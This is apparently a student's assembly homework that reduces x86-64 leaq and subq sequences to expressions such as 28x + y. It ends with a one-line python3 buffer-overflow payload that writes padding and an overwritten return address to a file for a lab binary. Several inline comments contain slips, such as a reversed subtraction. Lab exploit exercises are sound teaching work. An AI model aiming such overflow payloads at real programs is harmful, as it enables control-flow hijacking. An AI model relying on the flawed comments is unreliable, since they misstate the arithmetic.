# Assignment 10

## Q1
### Example:
```asm
; %rdi = First Argument
; %rsi = Second Argument

leaq    (%rsi, %rsi,2), %rax ; %rax = %rsi + %rsi * 2 = 3 * %rsi
leaq    (%rax, %rax,8), %rax ; %rax = %rax + %rax * 8 = 9 * %rax
addq    %rdi, %rax           ; %rax = %rdi + %rax = x + 27y
```
#### Answer:
%rax + ((3*9) * %rsi) =  %rax + (27 * %rsi)
= x + 27y

### Problem 1.
```asm
leaq    0(,%rdi,8), %rdx ; %rdx = 0 + %rdi * 8
subq    %rdi, %rdx       ; %rdx = %rdx - %rdi = %rdi * 7
leaq    0(,%rdx,4), %rax ; %rax = %rdx * 4    = 0 + (%rdx * 7) * 4 = %rdx  * 28
addq    %rax, %rsi       ; %rsi = %rsi + %rax = 28x + y
```
#### Answer:
28x + y

### Problem 2.
```asm
leaq    (%rsi,%rsi,8), %rax ; %rax = %rsi + %rsi * 8  = 9 * %rsi
leaq    0(,%rdi,8), %rdx    ; %rdx = 0 + %rdi * 8     = 8 * %rdi
addq    %rdx, %rax          ; %rax = (9 * %rax) + (8 * %rdx)
```

#### Answer:
8x + 9y

### Problem 3.
```asm
leaq    (%rsi,%rsi,8), %rcx ; %rcx = %rsi + %rsi * 8 = %rsi * 9
leaq    (%rcx,%rcx), %rdx   ; %rdx = %rcx + %rcx     = %rcx + %rcx = (%rsi * 9) + (%rsi * 9) = (%rsi * 18)
leaq    0(,%rdi,8), %rsi    ; %rsi = 8 * %rdi        
subq    %rdi, %rsi          ; %rsi = %rdi - %rsi = 7 * %rdi
addq    %rdx, %rsi          ; %rsi = %rdx + %rsi = (7 * %rdi) + (18 * %rsi)
```
#### Answer:

7x + 18y


## Q2
7

## Q3
0x400d00

## Q4
42


### Exploit
```bash
python3 -c 'print("A" * 10 + "B" * 0 + "\x58\x09\x40\x0a")' > raw_input.txt
```
